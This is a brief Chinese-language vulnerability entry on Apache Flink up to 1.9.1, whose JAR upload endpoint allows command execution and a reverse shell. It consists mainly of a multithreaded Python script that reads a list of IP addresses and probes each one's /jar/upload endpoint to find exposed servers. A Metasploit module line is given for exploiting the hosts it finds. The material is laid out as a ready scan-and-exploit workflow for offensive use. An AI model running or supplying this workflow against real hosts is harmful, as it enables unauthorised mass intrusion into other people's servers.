## 漏洞概述
Apache Flink 1.9.x 恶意JAR包上传，导致任意命令执行，反弹shell

## 影响范围
```http
版本：<= 1.9.1
```

## POC
```python
import os
import subprocess
import requests
from multiprocessing.dummy import Pool as ThreadPool

def get_iplist():
    iplist = []
    with open('iplist', 'r') as file:
        data = file.readlines()
        for item in data:
            ip = item.strip()
            iplist.append(ip)
    return iplist


def poc(ip):
    url = 'http://' + ip + ':8081/jar/upload'

    try:
        res = requests.get(url=url, timeout=2)
        data = {
            'msg': res.json(),
            'state': 1,
            'url': url,
            'ip': ip
        }

    except:
        data = {
            'msg': 'Secure',
            'state': 0,
            'ip': ip
        }

    if data['state'] == 1:
        print(data)


if __name__ == '__main__':
    iplist = get_iplist()

    pool = ThreadPool(50)
    pool.map(poc, iplist)
```

## EXP

```bash
use exploit/multi/http/apache_flink_jar_upload_exec
```

## 参考链接

https://www.exploit-db.com/exploits/48978